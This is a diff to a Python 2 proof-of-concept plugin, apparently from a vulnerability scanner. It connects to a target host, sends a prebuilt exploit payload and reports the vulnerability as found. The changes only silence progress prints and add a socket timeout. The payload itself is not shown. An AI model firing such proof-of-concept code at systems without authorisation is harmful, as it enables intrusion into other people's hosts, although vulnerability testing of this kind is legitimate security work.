@@ -109,25 +109,27 @@ class Poc(ABPoc):
             o = urlparse.urlparse(self.target)
             HOST = o.hostname
             PORT = o.port
-            print "[+] Connecting to host..."
+            # print "[+] Connecting to host..."
             try:
+                timeout = 20
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
                 s.connect((HOST, PORT))
                 print "[+] Connected."
 
             except:
                 print "[+] Unable to connect to host " + HOST + " on port " + str(PORT) + "."   
                 s.close()
-                print "[+] Exiting."
+                # print "[+] Exiting."
                 exit(0)
  
-            print "[+] Receiving greeting from remote host..."
+            # print "[+] Receiving greeting from remote host..."
             data = s.recv(1024)
-            print "[+] Done."
+            # print "[+] Done."
 
-            print "[+] Sending our payload..."
+            # print "[+] Sending our payload..."
             s.send(request)
-            print "[+] Done."
+            # print "[+] Done."
             #print "Our data: %r" % request
             self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                 target=self.target, name=self.vuln.name))
